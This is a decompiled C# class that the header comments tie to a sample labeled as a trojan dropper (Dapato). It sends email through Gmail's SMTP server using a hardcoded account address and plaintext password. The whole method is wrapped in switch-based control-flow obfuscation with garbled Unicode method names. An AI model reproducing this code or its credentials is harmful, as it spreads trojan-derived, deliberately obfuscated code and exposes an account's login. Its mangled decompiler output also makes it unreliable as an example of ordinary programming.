// Decompiled with JetBrains decompiler
// Type: AltiumManager.mailerClass
// Assembly: LeOcHwILpefYMF8, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A7C159C0-2645-0515-18CC-33AA0158F2C6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Dropper.MSIL.Dapato.gen-949b68beab7b82f9c18962df03d52a02a963263103606c758f668476868a1381.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net;
using System.Net.Mail;
using System.Text;

namespace AltiumManager
{
  public class mailerClass
  {
    private MailMessage mail;

    public mailerClass() => this.mail = new MailMessage();

    public void sendPassword(string tempAddress, string tempSubject, string tempBody)
    {
label_2:
      int num1 = AltiumDatabaseDataSet.UsersDataTable.\uE23F\uE7C9\uEE0F\uE7EA\uED41\uE818\uECBF\uEA9A\uF708\uE0CF\uE6D6\uEB0D(95);
      SmtpClient smtpClient;
      while (true)
      {
        switch ((num1 ^ 92) + 104)
        {
          case 0:
            smtpClient.EnableSsl = true;
            num1 = -64;
            continue;
          case 1:
            smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential("checkcorpaltiummanager@gmail.com", "checkPass00");
            num1 = AltiumDatabaseDataSet.ReleasedComponentsRowChangeEvent.\uE4B1\uE099\uEB2D\uF713\uEFE2\uE494\uE2B4\uEB29\uE7EC\uF1B8\uE270\uF6F8(93);
            continue;
          case 2:
            smtpClient.Host = "smtp.gmail.com";
            num1 = -63;
            continue;
          case 3:
            num1 = -58;
            continue;
          case 4:
            num1 = -2;
            continue;
          case 5:
            num1 = -60;
            continue;
          case 6:
            smtpClient = new SmtpClient();
            num1 = -59;
            continue;
          case 7:
            num1 = -4;
            continue;
          case 8:
            smtpClient.Port = 587;
            num1 = -57;
            continue;
          case 9:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (mailerClass.\u002Ector);
            num1 = -3;
            continue;
          case 10:
            goto label_14;
          default:
            goto label_2;
        }
      }
label_14:
      this.mail = new MailMessage();
      try
      {
        this.mail.From = new MailAddress("checkcorpaltiummanager@gmail.com", "Altium Admin", Encoding.UTF8);
label_17:
        int num2 = 16;
        while (true)
        {
          switch (num2 ^ 99)
          {
            case 108:
              this.mail.To.Add(tempAddress);
              num2 = 22;
              continue;
            case 109:
              num2 = 27;
              continue;
            case 110:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (mailerClass.\u002Ector);
              num2 = 13;
              continue;
            case 111:
              num2 = 18;
              continue;
            case 112:
              this.mail.Body = tempBody;
              num2 = 12;
              continue;
            case 113:
              this.mail.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;
              num2 = 14;
              continue;
            case 114:
              smtpClient.Send(this.mail);
              num2 = 20;
              continue;
            case 115:
              num2 = 15;
              continue;
            case 116:
              num2 = 19;
              continue;
            case 117:
              num2 = 26;
              continue;
            case 118:
              num2 = 17;
              continue;
            case 119:
              num2 = 25;
              continue;
            case 120:
              this.mail.ReplyToList.Add(tempAddress);
              num2 = 21;
              continue;
            case 121:
              this.mail.Subject = tempSubject;
              num2 = 23;
              continue;
            case 122:
              goto label_12;
            default:
              goto label_17;
          }
        }
label_12:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num3 = (int) Interaction.MsgBox((object) ex.ToString());
        ProjectData.ClearProjectError();
      }
    }
  }
}
